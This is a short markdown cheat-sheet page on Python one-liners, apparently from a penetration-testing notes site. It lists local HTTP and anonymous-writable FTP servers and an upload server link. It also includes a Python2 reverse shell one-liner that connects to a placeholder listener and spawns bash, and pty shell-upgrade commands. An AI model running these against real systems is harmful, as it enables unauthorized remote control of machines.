---
title : "Python"
# pre : ' '
description : "Python is a programming language that lets you work quickly and integrate systems more effectively."
date : 2022-12-05T09:22:16+01:00
# hidden : true
# draft : true
weight : 1400
tags : ['Python2', 'Python3', 'FTP', 'HTTP']
---

---

Python is a programming language that lets you work quickly and integrate systems more effectively.

## Python Web Server

Serving files with local web server.

Python2

```plain
python2 -m SimpleHTTPServer 9090
```

Python3

```plain
python3 -m http.server 9090
```

## Python2/3 FTP Server

Requires: `python2 -m pip install pyftpdlib` / `python3 -m pip install pyftpdlib`

**Note:** By default this will allow *anonymous* login. To use username/password based authentication, please use the `-u USERNAME` and `-P PASSWORD` flags.

```plain
python2 -m pyftpdlib -p 21 -w
```

```plain
python3 -m pyftpdlib -p 21 -w
```

## Python3 Web Server with Upload

Download script [here](https://gist.github.com/crypt0rr/19f009c90205697ef26ab1fd82c26903).

```plain
python3 HTTPServerWithUpload.py -p 80
python3 HTTPServerWithUpload.py --port 80
```

## Python2 One-Liner Reverse Shell

```plain
python2.7 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<<LISTERNER-IP>>",<<LISTERNER-PORT>>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

## Upgrade to Interactive Python Shell

Python2

```plain
python -c 'import pty; pty.spawn("/bin/bash")'
```

Python3

```plain
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## URL list

- [Python.org](https://www.python.org/)
- [Pythonium.net - Python tools](https://pythonium.net/)
